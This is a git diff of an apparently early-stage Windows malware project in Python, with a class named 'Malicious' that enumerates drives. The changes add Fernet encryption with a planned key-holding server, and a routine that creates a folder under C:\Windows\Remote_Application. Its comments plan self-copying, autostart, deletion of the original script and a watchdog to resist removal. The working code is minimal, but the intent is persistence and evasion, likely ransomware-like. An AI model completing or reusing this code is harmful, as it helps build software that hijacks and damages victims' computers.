@@ -4,17 +4,29 @@ import fnmatch
 import uuid
 import winreg
 import platform
+from cryptography.fernet import Fernet
 
 
 class Logging:
 
     def __init__(self) -> None:
-        self.logfile_location = "C:\\Windows"
+        self.log_folder_location = "C:\\Windows\\Remote_Application\\"
+        self.log_file = "logfile.txt"
     
-    def set_logging_location(self):
-        # For this function I want it to be able to be to check size of log location left, and be able to log rotate. Maybe not all in this
-        # function but defently in this class
+    def encrypt_string(self):
+        # I need to create the server first to hold the encryption key but I can follow https://www.youtube.com/watch?v=S-w24LtBub8
         pass
+    
+    def set_log(self):
+        pass
+
+    def create_working_enviroment(self):
+        does_path_exist = os.path.exists(self.log_folder_location)
+        if not does_path_exist:
+            os.makedirs(self.log_folder_location)
+            # I should probably call a copy to move the script to this location and set an auto start function. After this 
+            # I should remove the calling script and run on the location created. I also need to create another watchdog to make sure it
+            # doesn't get killed or deleted
 
 class Computer:
 
@@ -109,5 +121,7 @@ class Malicious:
                     self.list_of_all_connected_drives.append(letter)
                     
 
-obj = Computer()
-obj.get_uuid()
+obj = Logging()
+obj.create_working_enviroment()
+# obj = Computer()
+# obj.get_uuid()
